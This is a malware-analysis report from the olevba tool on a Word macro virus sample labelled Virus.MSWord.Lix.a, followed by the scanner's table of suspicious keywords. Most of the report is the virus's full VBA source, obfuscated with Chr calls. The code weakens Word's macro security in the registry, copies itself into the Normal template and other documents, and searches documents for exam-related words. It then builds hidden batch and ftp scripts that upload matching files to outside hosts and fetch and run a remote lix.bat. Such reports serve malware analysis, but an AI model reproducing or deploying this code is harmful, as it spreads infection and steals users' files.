olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lix.a-e0e9ec52adb27135b246ca3d5737fa5bc7ba09a9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lix.a-e0e9ec52adb27135b246ca3d5737fa5bc7ba09a9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO lix1.bas 
in file: Virus.MSWord.Lix.a-e0e9ec52adb27135b246ca3d5737fa5bc7ba09a9 - OLE stream: 'Macros/VBA/lix1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoclose()
On Error Resume Next
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Access" + Chr(86) + Chr(66) + Chr(79) + Chr(77)) = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
 End Select
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
nm = "cdrom"
yesnor = False
yesdoc = False
Set nor = NormalTemplate.VBProject.VBComponents
Set doc = ActiveDocument.VBProject.VBComponents
nor.Remove VbComponent:=nor.Item("lix")
doc.Remove VbComponent:=doc.Item("lix")
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115)
dropfile = sv + c1 + "\" + nm + "." + "txt"

If Dir(sv + c1, vbDirectory) = "" Then MkDir (sv + c1)
If doc.Count > 0 Then
For i = 1 To doc.Count
If doc.Item(i).Name = "lix1" Then yesdoc = True
  Next
End If
For Each VbComponent In nor
     If VbComponent.Name = "lix1" Then yesnor = True
  Next
If yesnor = False And ActiveDocument.Saved Then
      doc("lix1").Export dropfile
          nor.import dropfile
          NormalTemplate.Save

          
End If
If yesdoc = False Then
      nor("lix1").Export dropfile
          doc.import dropfile
          ActiveDocument.Save
End If
Call c002
End Sub
Sub c002()
On Error Resume Next
mySearchString = "Pr" + Chr(111) + Chr(118) + Chr(97)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
If x < 6 Then
  mySearchString = Chr(97) + "v" + Chr(97) + "li" + Chr(97) + "çã" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
  mySearchString = "c" + Chr(111) + "p" + Chr(101) + "v" + Chr(101)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
mySearchString = "c" + Chr(111) + "ncu" + Chr(114) + "s" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
End If
If x < 6 Then
    mySearchString = Chr(101) + "xc" + Chr(101) + "t" + Chr(111)
With Selection.Find
    .Text = mySearchString
    .MatchCase = False
    .MatchWholeWord = False
    .Forward = True
    If .Execute = True Then x = 6
End With
End If
    Selection.GoTo What:=wdGoToPage, Which:=wdGoToNext, Name:="1"
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = ""
        .Replacement.Text = ""
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
 sn = Left(ActiveDocument.Name, Len(ActiveDocument.Name) - 3) + "j" + Chr(112) + "g"
 s2 = ActiveDocument.Name
 src = ActiveDocument.FullName
 s1 = sv + c1 + Chr(99) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)

  If x = 6 Then

         m1 = sv + c1 + "m1.bat"
         Open m1 For Output As #1
       Print #1, "copy " + Chr(34) + src + Chr(34) + "  " + Chr(34) + sv + c1 + sn + Chr(34) + " /y"
        Close #1
         Shell m1, vbHide
            Open s1 For Output As #1
    Print #1, "o " + Chr(99) + "dr" + Chr(111) + Chr(109) + "." + Chr(115) + Chr(101) + "rvegame" + Chr(46) + Chr(99) + "om"
    Print #1, "us" + Chr(101) + "r n" + Chr(111) + "vat" + Chr(111) + "  " + Chr(99) + "drom"
    Print #1, "binary"
    Print #1, "m" + Chr(112) + "ut " + sv + c1 + Chr(42) + ".j" + Chr(112) + "g"
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1
    sn = sv + c1 + Chr(99) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
    Open sn For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -i -n -s:" + s1
    Print #1, "i" + Chr(102) + " ex" + Chr(105) + "s" + Chr(116) + " " + sv + c1 + "l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116) + " g" + Chr(111) + "t" + Chr(111) + " l" + Chr(105) + "x"
    Close #1
         Shell sn, vbHide
    End If
   ActiveDocument.Close

End Sub


Sub autoexit()
On Error Resume Next
sv = Chr(Int(Rnd) + 1 * 165 + 35 - 101) + ":" + Chr(Int(Rnd) + 1 * 165 + 35 - 108)
Kill sv + c1 + "l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
c1 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115) + Chr(92)
s1 = sv + c1 + Chr(99) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)
c11 = Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(99) + Chr(111) + Chr(111) + Chr(107) + Chr(105) + Chr(101) + Chr(115)
s1s = sv + c1 + Chr(98) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(102) + Chr(116) + Chr(112)
sns = sv + c1 + Chr(98) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
sn = sv + c1 + Chr(99) + Chr(99) + Chr(97 + 2 + 1) + "." + Chr(98) + Chr(97) + Chr(116)
Set Search = Word.Application.FileSearch
Search.LookIn = "c:\" + c11: Search.SearchSubFolders = False: Search.FileName = Chr(42) + Chr(106) + Chr(112) + Chr(103): Search.Execute
   If Search.FoundFiles.Count > 0 Then
   
    Open sns For Output As #1
    Print #1, "f" + Chr(116) + "p" + Chr(46) + Chr(101) + "x" + Chr(101) + " -i -s:" + s1s
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + "f" + Chr(116) + "p"
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + Chr(106) + Chr(112) + Chr(103)
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + "b" + "a" + Chr(116)
    Print #1, ":l" + Chr(105) + "x"
    Print #1, sv + c1 + "l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + "f" + Chr(116) + "p"
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + Chr(106) + Chr(112) + Chr(103)
    Print #1, Chr(103 - 3); "el " + sv + c1 + Chr(42) + "." + "b" + "a" + Chr(116)

    Close #1
    Open s1s For Output As #1
    Print #1, "o " + Chr(102) + "t" + Chr(112) + Chr(46) + Chr(104) + Chr(97) + Chr(116) + Chr(101); "-i" + Chr(110) + Chr(99) + Chr(46) + Chr(99) + "o" + Chr(109)
    Print #1, Chr(116) + Chr(101) + "s" + Chr(116) + Chr(101)
    Print #1, Chr(116) + Chr(101) + "s" + Chr(116) + Chr(101)
    Print #1, Chr(99) + Chr(100) + " l" + Chr(111) + "gf" + Chr(105) + "les"
    Print #1, "binary"
    Print #1, "m" + Chr(112) + "ut " + sv + c1 + Chr(42) + "." + Chr(106) + Chr(112) + Chr(103)
    Print #1, Chr(103) + Chr(101) + Chr(116) + " l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116) + " " + sv + c1 + "l" + Chr(105) + Chr(120) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
    Print #1, "q" + Chr(117) + Chr(105) + "t"
    Close #1
   End If
   Select Case Application.Version
    Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Access" + Chr(86) + Chr(66) + Chr(79) + Chr(77)) = 1&
    Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    End Select

        Shell sns, vbHide

End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |m1.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

